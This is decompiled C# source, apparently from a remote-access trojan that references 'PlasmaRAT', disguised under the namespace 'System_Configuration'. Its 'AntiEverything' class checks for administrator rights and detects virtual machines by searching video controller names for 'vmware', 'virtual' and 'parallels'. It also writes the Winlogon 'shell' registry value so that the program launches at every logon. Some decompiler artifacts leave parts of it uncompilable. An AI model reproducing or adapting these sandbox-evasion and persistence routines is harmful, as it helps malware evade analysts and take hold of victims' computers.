using System;
using System.IO;
using System.Management;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace System_Configuration
{
	// Token: 0x02000013 RID: 19
	[StandardModule]
	internal sealed class AntiEverything
	{
		// Token: 0x0600007F RID: 127 RVA: 0x000083D0 File Offset: 0x000065D0
		public static bool IsAdmin()
		{
			bool result;
			try
			{
				WindowsIdentity current = WindowsIdentity.GetCurrent();
				WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
				result = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00008418 File Offset: 0x00006618
		public static void RunAntis()
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				if (File.Exists(Path.GetTempPath() + "microsoft.ini"))
				{
					goto IL_27;
				}
				IL_1F:
				num2 = 3;
				AntiEverything.AntiVM();
				IL_27:
				goto IL_8A;
				IL_29:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_4B:
				goto IL_7F;
				IL_4D:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_5D:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_4D;
			}
			IL_7F:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_8A:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000081 RID: 129 RVA: 0x000084C8 File Offset: 0x000066C8
		public static string AntiVM()
		{
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
				string str = string.Empty;
				try
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						str = Convert.ToString(RuntimeHelpers.GetObjectValue(managementObject["Description"]));
						string text = Strings.StrConv(str, VbStrConv.Lowercase, 0);
						if (text.Contains("virtual"))
						{
							AntiEverything.AntisFound();
						}
						if (text.Contains("vmware"))
						{
							AntiEverything.AntisFound();
						}
						if (text.Contains("parallels"))
						{
							AntiEverything.AntisFound();
						}
						if (text.Contains("vm additions"))
						{
							AntiEverything.AntisFound();
						}
					}
				}
				finally
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator;
					if (enumerator != null)
					{
						((IDisposable)enumerator).Dispose();
					}
				}
			}
			catch (Exception ex)
			{
			}
			string result;
			return result;
		}

		// Token: 0x06000082 RID: 130 RVA: 0x000085B0 File Offset: 0x000067B0
		public static void AntisFound()
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				PlasmaRAT.WhatToRun = "";
				IL_13:
				num2 = 3;
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", true);
				IL_26:
				num2 = 4;
				registryKey.SetValue("shell", "explorer.exe,\"" + Application.ExecutablePath + "\"");
				IL_47:
				num2 = 5;
				registryKey.Close();
				IL_4F:
				goto IL_B6;
				IL_51:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_77:
				goto IL_AB;
				IL_79:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_89:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_79;
			}
			IL_AB:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_B6:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0400006F RID: 111
		public static bool AntisDetected = false;
	}
}
